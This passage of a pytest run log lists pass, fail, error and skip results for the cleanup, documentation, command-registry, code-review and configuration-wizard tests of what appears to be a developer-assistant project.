tests/operations/test_cleanup_orchestrator.py::TestGitOperations::test_git_commit_success PASSED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestGitOperations::test_no_commit_when_no_changes PASSED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestOptimizationIntegration::test_optimization_trigger FAILED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestOptimizationIntegration::test_optimization_failure_handling FAILED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestFullWorkflow::test_quick_profile PASSED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestFullWorkflow::test_comprehensive_profile PASSED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestFullWorkflow::test_metrics_tracking PASSED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestErrorHandling::test_invalid_project_root PASSED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestErrorHandling::test_git_operation_failure FAILED [ 28%]
tests/operations/test_design_sync_orchestrator.py::TestStatusFileConsolidation::test_consolidate_preserves_progress_bars PASSED [ 28%]
tests/operations/test_design_sync_orchestrator.py::TestStatusFileConsolidation::test_consolidate_preserves_file_size PASSED [ 28%]
tests/operations/test_design_sync_orchestrator.py::TestStatusFileConsolidation::test_consolidate_handles_multiple_asterisks PASSED [ 28%]
tests/operations/test_design_sync_orchestrator.py::TestStatusFileConsolidation::test_consolidate_updates_metrics_correctly PASSED [ 28%]
tests/operations/test_design_sync_orchestrator.py::TestStatusFileConsolidation::test_consolidate_first_time_adds_timestamp PASSED [ 29%]
tests/operations/test_design_sync_orchestrator.py::TestStatusFileConsolidation::test_consolidate_multiple_runs_idempotent PASSED [ 29%]
tests/operations/test_design_sync_orchestrator.py::TestDesignSyncIntegration::test_design_sync_operation_completes PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_scan_module PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_build_module PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_publish_module PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_complete_workflow PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_scan_missing_src_dir PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_build_missing_docstring_index PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_publish_missing_api_docs PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_module_dependencies PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_docstring_extraction_quality PASSED [ 29%]
tests/operations/test_documentation_workflow.py::TestDocumentationWorkflow::test_markdown_formatting PASSED [ 29%]
tests/operations/test_enhanced_headers.py::test_minimalist_header_with_purpose PASSED [ 29%]
tests/operations/test_enhanced_headers.py::test_minimalist_header_without_purpose PASSED [ 29%]
tests/operations/test_enhanced_headers.py::test_completion_footer_with_accomplishments PASSED [ 29%]
tests/operations/test_enhanced_headers.py::test_completion_footer_without_accomplishments PASSED [ 29%]
tests/operations/test_enhanced_headers.py::test_completion_footer_failure PASSED [ 29%]
tests/operations/test_enhanced_headers.py::test_dry_run_mode_header PASSED [ 29%]
tests/operations/test_enhanced_headers.py::test_profile_specific_purposes PASSED [ 29%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_dry_run_preview PASSED [ 29%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_dry_run_hyphenated PASSED [ 29%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_dry_run_spaced PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_dry_run_simulate PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_dry_run_test PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_dry_run_what_would PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_dry_run_show_me PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_live_run_execute PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_live_run_apply PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_live_run_actually PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_live_run_for_real PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_default_live PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeDetection::test_detect_case_insensitive PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeArgs::test_parse_dry_run_true PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeArgs::test_parse_dry_run_false PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeArgs::test_parse_dry_run_missing PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeArgs::test_parse_with_other_args PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeFormatting::test_format_dry_run PASSED [ 30%]
tests/operations/test_execution_mode.py::TestExecutionModeFormatting::test_format_live PASSED [ 30%]
tests/operations/test_execution_mode.py::TestConfirmationPrompt::test_no_confirmation_dry_run PASSED [ 30%]
tests/operations/test_execution_mode.py::TestConfirmationPrompt::test_confirmation_for_destructive_live PASSED [ 30%]
tests/operations/test_execution_mode.py::TestConfirmationPrompt::test_no_confirmation_for_safe_live PASSED [ 30%]
tests/operations/test_execution_mode.py::TestDryRunMixin::test_detect_mode_from_request PASSED [ 30%]
tests/operations/test_execution_mode.py::TestDryRunMixin::test_is_dry_run_check PASSED [ 31%]
tests/operations/test_execution_mode.py::TestDryRunMixin::test_print_copyright_header FAILED [ 31%]
tests/operations/test_execution_mode.py::TestDryRunMixin::test_print_copyright_header_dry_run FAILED [ 31%]
tests/operations/test_execution_mode.py::TestDryRunMixin::test_format_dry_run_result PASSED [ 31%]
tests/operations/test_execution_mode.py::TestDryRunMixin::test_should_confirm PASSED [ 31%]
tests/operations/test_execution_mode.py::TestModeMixinIntegration::test_apply_mode_to_modules PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[cleanup workspace-ExecutionMode.LIVE] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[preview cleanup workspace-ExecutionMode.DRY_RUN] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[dry-run cleanup-ExecutionMode.DRY_RUN] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[test cleanup before running-ExecutionMode.DRY_RUN] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[what would cleanup do-ExecutionMode.DRY_RUN] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[show me what would be cleaned-ExecutionMode.DRY_RUN] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[actually run cleanup now-ExecutionMode.LIVE] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[execute cleanup for real-ExecutionMode.LIVE] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[optimize cortex-ExecutionMode.LIVE] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[simulate optimization-ExecutionMode.DRY_RUN] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[refresh story-ExecutionMode.LIVE] PASSED [ 31%]
tests/operations/test_execution_mode.py::TestRealWorldExamples::test_real_world_detection[preview story changes-ExecutionMode.DRY_RUN] PASSED [ 31%]
tests/operations/test_help_command.py::TestHelpCommand::test_show_help_table_format PASSED [ 31%]
tests/operations/test_help_command.py::TestHelpCommand::test_show_help_list_format PASSED [ 31%]
tests/operations/test_help_command.py::TestHelpCommand::test_show_help_detailed_format PASSED [ 31%]
tests/operations/test_help_command.py::TestHelpCommand::test_status_icons_present PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommand::test_operations_sorted_alphabetically PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommand::test_all_operations_included PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommand::test_status_determination PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommand::test_find_command PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommand::test_execute_operation_help PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommand::test_help_aliases PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommand::test_help_format_parameter PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommandEdgeCases::test_empty_factory PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommandEdgeCases::test_missing_natural_language PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommandEdgeCases::test_invalid_format PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommandEdgeCases::test_find_nonexistent_command PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommandOutput::test_no_truncation_issues PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommandOutput::test_legend_completeness PASSED [ 32%]
tests/operations/test_help_command.py::TestHelpCommandOutput::test_usage_instructions_present PASSED [ 32%]
tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_metadata ERROR [ 32%]
tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_validate_prerequisites_success ERROR [ 32%]
tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_validate_prerequisites_missing_git ERROR [ 32%]
tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_validate_prerequisites_missing_tests ERROR [ 32%]
tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizeCortexOrchestrator::test_validate_prerequisites_missing_knowledge_graph ERROR [ 32%]
tests/operations/test_optimize_cortex_orchestrator.py::TestSKULLTests::test_run_skull_tests_success ERROR [ 32%]
tests/operations/test_optimize_cortex_orchestrator.py::TestSKULLTests::test_run_skull_tests_failure ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestSKULLTests::test_run_skull_tests_timeout ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestArchitectureAnalysis::test_analyze_knowledge_graph ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestArchitectureAnalysis::test_analyze_operations ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestArchitectureAnalysis::test_analyze_brain_protection ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizationPlan::test_generate_plan_with_issues ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizationPlan::test_generate_plan_with_high_frequency_patterns ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizationExecution::test_execute_optimizations ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestOptimizationExecution::test_execute_optimizations_with_failures ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestGitOperations::test_git_commit_success ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestGitOperations::test_git_commit_no_changes ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestIntegration::test_full_optimization_workflow ERROR [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestMetrics::test_optimization_metrics_initialization PASSED [ 33%]
tests/operations/test_optimize_cortex_orchestrator.py::TestMetrics::test_generate_optimization_report ERROR [ 33%]
tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_story_refresh_changes_output_file FAILED [ 33%]
tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_story_refresh_produces_git_diff FAILED [ 33%]
tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_apply_narrator_voice_not_passthrough FAILED [ 33%]
tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_operation_success_matches_actual_changes FAILED [ 33%]
tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_story_output_has_expected_sections FAILED [ 33%]
tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_all_story_modules_executed PASSED [ 33%]
tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_operation_handles_missing_source FAILED [ 33%]
tests/operations/test_story_refresh_integration.py::TestMockDetectionForAllOperations::test_no_mocks_in_environment_setup PASSED [ 34%]
tests/operations/test_story_refresh_integration.py::TestMockDetectionForAllOperations::test_no_mocks_in_demo_modules FAILED [ 34%]
tests/operations/test_story_refresh_integration.py::TestStoryRefreshPerformance::test_story_refresh_completes_within_5_seconds PASSED [ 34%]
tests/operations/test_workspace_cleanup.py::test_cleanup_safe_profile_scans_and_reports FAILED [ 34%]
tests/operations/test_workspace_cleanup.py::test_cleanup_standard_profile_removes_old_logs_and_cache FAILED [ 34%]
tests/operations/test_workspace_cleanup.py::test_cleanup_vacuums_databases_when_present FAILED [ 34%]
tests/performance/test_performance_regression.py::test_tier1_get_recent_conversations_performance PASSED [ 34%]
tests/performance/test_performance_regression.py::test_tier1_get_conversation_by_id_performance PASSED [ 34%]
tests/performance/test_performance_regression.py::test_tier1_average_performance PASSED [ 34%]
tests/performance/test_performance_regression.py::test_tier2_search_patterns_fts_performance PASSED [ 34%]
tests/performance/test_performance_regression.py::test_tier2_average_performance PASSED [ 34%]
tests/performance/test_performance_regression.py::test_tier3_get_git_metrics_performance PASSED [ 34%]
tests/performance/test_performance_regression.py::test_tier3_analyze_file_hotspots_performance PASSED [ 34%]
tests/performance/test_performance_regression.py::test_operation_help_command_performance PASSED [ 34%]
tests/performance/test_performance_regression.py::test_operation_environment_setup_performance PASSED [ 34%]
tests/performance/test_performance_regression.py::test_all_tiers_meet_targets PASSED [ 34%]
tests/platform/test_macos_edge_cases.py::TestMacOSEdgeCases::test_case_sensitive_filesystem_handling SKIPPED [ 34%]
tests/platform/test_macos_edge_cases.py::TestMacOSEdgeCases::test_unix_path_separators SKIPPED [ 34%]
tests/platform/test_macos_edge_cases.py::TestMacOSEdgeCases::test_homebrew_python_detection SKIPPED [ 34%]
tests/platform/test_macos_edge_cases.py::TestMacOSEdgeCases::test_macos_file_permissions_and_sandboxing SKIPPED [ 34%]
tests/platform/test_macos_edge_cases.py::TestMacOSPerformanceOptimizations::test_apfs_features_available SKIPPED [ 34%]
tests/platform/test_macos_edge_cases.py::TestMacOSPerformanceOptimizations::test_spotlight_search_available SKIPPED [ 35%]
tests/platform/test_macos_edge_cases.py::test_mac_edge_cases_summary SKIPPED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestCleanupPluginInitialization::test_metadata PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestCleanupPluginInitialization::test_initialization_success PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestCleanupPluginInitialization::test_initialization_with_defaults PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestTempFileCleanup::test_cleanup_old_temp_files PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestTempFileCleanup::test_preserve_recent_temp_files PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestTempFileCleanup::test_preserve_patterns PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestBackupFileCleanup::test_cleanup_old_backups PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestCacheCleanup::test_cleanup_pycache PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestLogFileCleanup::test_archive_old_logs PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestDuplicateDetection::test_detect_duplicates PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestDuplicateDetection::test_ignore_small_duplicates PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestEmptyDirectoryCleanup::test_cleanup_empty_dirs PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestEmptyDirectoryCleanup::test_cleanup_nested_empty_dirs PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestEmptyDirectoryCleanup::test_preserve_dirs_with_files PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestLargeFileDetection::test_detect_large_files PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestStructureEnforcement::test_enforce_structure PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestStructureEnforcement::test_detect_misplaced_files PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestDryRunMode::test_dry_run_no_deletion PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestDryRunMode::test_actual_deletion_when_not_dry_run PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestReporting::test_generate_report PASSED [ 35%]
tests/plugins/test_cleanup_plugin.py::TestReporting::test_report_contains_stats PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestReporting::test_report_saved_to_file PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestHealthReport::test_generate_health_report PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestCleanupStats::test_stats_initialization PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestCleanupStats::test_stats_space_conversion PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestCleanupStats::test_stats_to_dict PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestPluginCleanup::test_plugin_cleanup PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestErrorHandling::test_handle_permission_errors PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestErrorHandling::test_handle_missing_directories PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestEdgeCases::test_cleanup_with_no_files PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestEdgeCases::test_cleanup_with_special_characters PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestGitHubArchival::test_archive_backups_to_github FAILED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestGitHubArchival::test_manifest_creation PASSED [ 36%]
tests/plugins/test_cleanup_plugin.py::TestGitHubArchival::test_backup_archive_cleanup PASSED [ 36%]
tests/plugins/test_code_review_plugin.py::TestSOLIDAnalyzer::test_detect_srp_violation_many_methods PASSED [ 36%]
tests/plugins/test_code_review_plugin.py::TestSOLIDAnalyzer::test_no_srp_violation_few_methods PASSED [ 36%]
tests/plugins/test_code_review_plugin.py::TestSOLIDAnalyzer::test_detect_dip_violation_direct_instantiation PASSED [ 36%]
tests/plugins/test_code_review_plugin.py::TestSOLIDAnalyzer::test_ignore_builtin_types PASSED [ 36%]
tests/plugins/test_code_review_plugin.py::TestSecurityScanner::test_detect_hardcoded_password PASSED [ 36%]
tests/plugins/test_code_review_plugin.py::TestSecurityScanner::test_detect_hardcoded_api_key FAILED [ 36%]
tests/plugins/test_code_review_plugin.py::TestSecurityScanner::test_detect_sql_injection_concatenation FAILED [ 36%]
tests/plugins/test_code_review_plugin.py::TestSecurityScanner::test_detect_sql_injection_fstring PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestSecurityScanner::test_detect_xss_innerHTML PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestSecurityScanner::test_detect_xss_react_dangerous PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestPerformanceAnalyzer::test_detect_n_plus_one_query PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestPerformanceAnalyzer::test_detect_blocking_sleep_in_async PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestPerformanceAnalyzer::test_detect_blocking_requests_in_async PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestPerformanceAnalyzer::test_detect_inefficient_string_concat_in_loop PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_plugin_initialization PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_detect_language_python PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_detect_language_javascript PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_detect_language_typescript PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_detect_language_csharp PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_calculate_score_no_violations PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_calculate_score_with_critical_violations PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_calculate_score_weighted_by_severity PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_generate_recommendations_for_secrets PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_generate_recommendations_for_srp PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_generate_recommendations_for_sql_injection PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_execute_review_with_violations PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_execute_review_calculates_score PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_filter_by_confidence_threshold PASSED [ 37%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_limit_violations_per_file PASSED [ 38%]
tests/plugins/test_code_review_plugin.py::TestCodeReviewPlugin::test_cleanup PASSED [ 38%]
tests/plugins/test_code_review_plugin.py::TestReviewResult::test_count_violations_by_severity PASSED [ 38%]
tests/plugins/test_code_review_plugin.py::TestReviewResult::test_to_dict_includes_all_fields PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestRouterCommandExpansion::test_slash_command_expanded_before_routing ERROR [ 38%]
tests/plugins/test_command_expansion.py::TestRouterCommandExpansion::test_natural_language_passes_through ERROR [ 38%]
tests/plugins/test_command_expansion.py::TestRouterCommandExpansion::test_unknown_slash_command_passes_through ERROR [ 38%]
tests/plugins/test_command_expansion.py::TestCommandAliasExpansion::test_primary_and_alias_expand_identically PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestPlatformCommandExpansion::test_mac_command_expansion PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestPlatformCommandExpansion::test_windows_command_expansion PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestPlatformCommandExpansion::test_setup_command_expansion PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestCommandExpansionPerformance::test_expansion_is_fast PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestCommandExpansionPerformance::test_is_command_is_fast PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestCommandExpansionEdgeCases::test_empty_string PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestCommandExpansionEdgeCases::test_whitespace_only PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestCommandExpansionEdgeCases::test_slash_only PASSED [ 38%]
tests/plugins/test_command_expansion.py::TestCommandExpansionEdgeCases::test_case_sensitivity PASSED [ 38%]
tests/plugins/test_command_registry.py::TestCommandRegistryInitialization::test_registry_creation PASSED [ 38%]
tests/plugins/test_command_registry.py::TestCommandRegistryInitialization::test_singleton_pattern PASSED [ 38%]
tests/plugins/test_command_registry.py::TestCommandRegistryInitialization::test_core_commands_registered PASSED [ 38%]
tests/plugins/test_command_registry.py::TestCommandRegistryInitialization::test_registry_stats_initial PASSED [ 38%]
tests/plugins/test_command_registry.py::TestCommandRegistration::test_register_valid_command PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandRegistration::test_register_command_with_aliases PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandRegistration::test_command_conflict_detection PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandRegistration::test_invalid_command_format PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandExpansion::test_expand_registered_command PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandExpansion::test_expand_alias PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandExpansion::test_expand_non_command_returns_none PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandExpansion::test_expand_with_whitespace PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandQuery::test_get_command_metadata PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandQuery::test_get_plugin_commands PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandQuery::test_get_commands_by_category PASSED [ 39%]
tests/plugins/test_command_registry.py::TestCommandQuery::test_get_all_commands PASSED [ 39%]
tests/plugins/test_command_registry.py::TestHelpGeneration::test_generate_help_all_commands PASSED [ 39%]
tests/plugins/test_command_registry.py::TestHelpGeneration::test_generate_help_by_category PASSED [ 39%]
tests/plugins/test_command_registry.py::TestHelpGeneration::test_help_includes_aliases PASSED [ 39%]
tests/plugins/test_command_registry.py::TestIsCommand::test_is_command_registered PASSED [ 39%]
tests/plugins/test_command_registry.py::TestIsCommand::test_is_command_not_registered PASSED [ 39%]
tests/plugins/test_command_registry.py::TestIsCommand::test_is_command_with_whitespace PASSED [ 39%]
tests/plugins/test_command_registry.py::TestRegistryStats::test_stats_after_registrations PASSED [ 39%]
tests/plugins/test_command_registry.py::TestPlatformSwitchCommands::test_platform_commands_registered FAILED [ 39%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_plugin_initialization ERROR [ 39%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_mode ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_oracle_from_code ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_apis_from_code ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_from_environment ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_apis_from_environment ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_parse_tnsnames ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_save_to_config ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_database_connection_dataclass PASSED [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_api_endpoint_dataclass PASSED [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_openapi_specs ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_validate_api_connection ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_non_interactive_mode ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_extract_namespace_from_dsn ERROR [ 40%]
tests/plugins/test_configuration_wizard_plugin.py::TestConfigurationWizardPlugin::test_discover_all_integration ERROR [ 40%]
tests/plugins/test_doc_refresh_file_rules.py::TestDocRefreshFileCreationProhibition::test_fails_when_file_does_not_exist FAILED [ 40%]
tests/plugins/test_doc_refresh_file_rules.py::TestDocRefreshFileCreationProhibition::test_refresh_all_docs_fails_on_missing_file PASSED [ 40%]
tests/plugins/test_doc_refresh_file_rules.py::TestDocRefreshFileCreationProhibition::test_prohibits_quick_read_creation FAILED [ 40%]
tests/plugins/test_doc_refresh_file_rules.py::TestDocRefreshFileCreationProhibition::test_prohibits_summary_variant_creation FAILED [ 40%]
tests/plugins/test_doc_refresh_file_rules.py::TestDocRefreshFileCreationProhibition::test_only_updates_existing_files PASSED [ 40%]
tests/plugins/test_doc_refresh_file_rules.py::TestReadTimeEnforcement::test_validate_read_time_calculates_correctly PASSED [ 40%]
tests/plugins/test_doc_refresh_file_rules.py::TestReadTimeEnforcement::test_validate_read_time_detects_too_long PASSED [ 40%]
tests/plugins/test_doc_refresh_file_rules.py::TestReadTimeEnforcement::test_validate_read_time_detects_too_short PASSED [ 41%]
tests/plugins/test_doc_refresh_file_rules.py::TestReadTimeEnforcement::test_validate_read_time_acceptable_range PASSED [ 41%]
tests/plugins/test_doc_refresh_file_rules.py::TestReadTimeEnforcement::test_transformation_plan_includes_read_time_enforcement PASSED [ 41%]
tests/plugins/test_doc_refresh_file_rules.py::TestReadTimeEnforcement::test_story_refresh_includes_read_time_validation PASSED [ 41%]
tests/plugins/test_doc_refresh_file_rules.py::TestConfigurationEnforcement::test_default_config_enforces_no_file_creation PASSED [ 41%]
tests/plugins/test_doc_refresh_file_rules.py::TestConfigurationEnforcement::test_default_config_enforces_read_time PASSED [ 41%]
tests/plugins/test_doc_refresh_file_rules.py::TestConfigurationEnforcement::test_default_config_trims_on_exceed PASSED [ 41%]
tests/plugins/test_doc_refresh_file_rules.py::TestConfigurationEnforcement::test_target_read_time_has_valid_range PASSED [ 41%]
tests/plugins/test_doc_refresh_file_rules.py::TestDocumentationHeaderRules::test_module_docstring_contains_critical_rules PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshPluginInitialization::test_plugin_creation PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshPluginInitialization::test_plugin_metadata PASSED [ 41%]
tests/plugins/test_doc_refresh_plugin.py::TestDocRefreshPluginInitialization::test_plugin_hooks PASSED [ 41%]
